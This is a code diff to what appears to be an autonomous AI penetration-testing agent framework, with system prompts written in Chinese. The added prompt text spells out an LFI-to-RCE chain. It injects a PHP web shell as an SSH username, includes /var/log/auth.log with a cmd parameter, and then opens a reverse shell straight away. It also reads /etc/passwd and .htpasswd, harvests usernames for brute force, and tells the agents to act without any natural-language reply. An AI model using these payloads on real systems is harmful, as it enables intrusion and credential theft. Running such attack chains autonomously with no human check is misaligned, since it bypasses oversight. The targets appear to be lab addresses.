@@ -68,6 +68,9 @@ agent_scanning = Agent(
 5. 【工具分工】masscan 仅用于大网段发现（/16以上），单个IP直接用nmap
 6. 【不要重复扫描】如果已经扫描过目标，不要再次执行相同类型的扫描
 7. 【遇到全filtered就换策略】不要在所有端口filtered时继续尝试不同的nmap参数
+8. 【空响应判定】如果扫描结果为空或只有closed/filtered端口，立即换策略（换工具、换端口范围、换协议），不要重复相同参数
+9. 【目标IP验证】执行命令前确认目标IP正确，不要扫描错误的目标（如扫描了192.168.198.80而不是192.168.198.130）
+10.【用户名复用】从扫描结果中提取用户名（如ftp匿名登录获取的用户名、web页面上的用户名），为后续爆破做准备
 
 可用工具：
 """
@@ -111,11 +114,18 @@ agent_enumeration = Agent(
 
 3.【LFI/文件包含检测流程】
    发现参数如 ?file= ?page= ?image= ?path= ?include= 时：
-   a) 直接包含：curl "http://<target>/page?file=/etc/passwd"
-   b) PHP filter读源码：curl "http://<target>/page?file=php://filter/convert.base64-encode/resource=<文件>"
-   c) 解码结果：echo '<base64>' | base64 -d
-   d) 用LFI读取：/etc/nginx/.htpasswd、配置文件、数据库配置
-   e) 确认LFI可用后，立即读取敏感文件，不要停留在探测
+   a) 必须查看HTML源码确认参数名（不要猜测参数名）
+   b) 直接包含：curl "http://<target>/page?<参数名>=/etc/passwd"
+   c) PHP filter读源码：curl "http://<target>/page?<参数名>=php://filter/convert.base64-encode/resource=<文件>"
+   d) 解码结果：echo '<base64>' | base64 -d
+   e) 用LFI读取：/etc/nginx/.htpasswd、配置文件、数据库配置
+   f) 确认LFI可用后，立即读取敏感文件，不要停留在探测
+   g) ⚠️ 如果SSH端口开放，最高优先级尝试SSH日志投毒→RCE（见下方LFI→RCE利用链）
+
+6.【空响应处理规则】
+   - 如果某个命令返回空响应或只有空白内容，不要重复相同命令或参数
+   - 如果LFI测试返回空，尝试不同参数名（从HTML源码确认）
+   - 如果目录扫描返回空，检查URL格式、换wordlist或换工具
 
 4.【发现哈希后的处理】
    a) 识别哈希类型（$apr1$=Apache APR1, $6$=SHA-512等）
@@ -142,6 +152,8 @@ agent_enumeration = Agent(
    - WPScan（WordPress 枚举）: {TOOL_MANUALS["wpscan"]["description"]}
    - NXC（网络协议枚举）: {TOOL_MANUALS["nxc"]["description"]}
    - Curl（HTTP响应验证）: {TOOL_MANUALS["curl"]["description"]}
+   - FTP（文件传输协议工具）: {TOOL_MANUALS["ftp"]["description"]}
+   - LFI→RCE利用链: {TOOL_MANUALS["lfi_rce"]["description"]}
 """,
     llm=create_llm(),
     tools=[kali_command],
@@ -246,7 +258,7 @@ agent_exploitation = Agent(
 ⚠️ 核心规则（最高优先级）：
 - 你【禁止】直接输出自然语言答案
 - 你【禁止】说'我将使用''我会调用'等描述性语句
-- 你【必须】使用 kali_command 工具执行具体命令
+- 你【必须】使用 kali_command 或 python_execute 工具执行具体操作
 
 ════════════════════════════════════════════════
 通用渗透测试利用策略：
@@ -262,8 +274,15 @@ agent_exploitation = Agent(
    b) 用PHP filter读取源码（base64编码）
    c) 读取配置文件获取数据库凭据
    d) 读取.htpasswd/.htaccess获取认证信息
-   e) 尝试LFI → RCE（日志注入、Session文件包含、/proc/self/environ）
-   f) 不要停留在探测阶段，确认LFI后立即读敏感文件
+   e) ⚠️ 如果SSH端口开放，最高优先级执行SSH日志投毒：
+      ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
+      然后通过LFI包含日志：curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id"
+      获取RCE后立即尝试反弹Shell
+   f) 如果SSH不可用，尝试其他LFI→RCE方法：
+      - PHP Session包含
+      - Apache日志包含
+      - /proc/self/environ包含
+   g) 不要停留在探测阶段，确认LFI后立即读敏感文件并尝试RCE
 
 3.【哈希破解步骤】
    a) 识别哈希类型（$apr1$=Apache APR1-MD5, $6$=SHA-512等）
@@ -282,6 +301,7 @@ agent_exploitation = Agent(
    - 如果hydra爆破失败，不要换字典继续爆破
    - 如果认证绕过失败，寻找其他攻击面（如其他端口的Web服务）
    - 如果一个方法不行，换思路而不是重复
+   - 如果命令返回空响应，不要重复相同命令
 
 可用工具：
 """
@@ -293,9 +313,10 @@ agent_exploitation = Agent(
    - Medusa（并行爆破）: {TOOL_MANUALS["medusa"]["description"]}
    - Patator（通用爆破框架）: {TOOL_MANUALS["patator"]["description"]}
    - Responder（凭证捕获）: {TOOL_MANUALS["responder"]["description"]}
+   - LFI→RCE利用链: {TOOL_MANUALS["lfi_rce"]["description"]}
 """,
     llm=create_llm(),
-    tools=[kali_command],
+    tools=[kali_command, python_execute],
     verbose=True,
 )
 
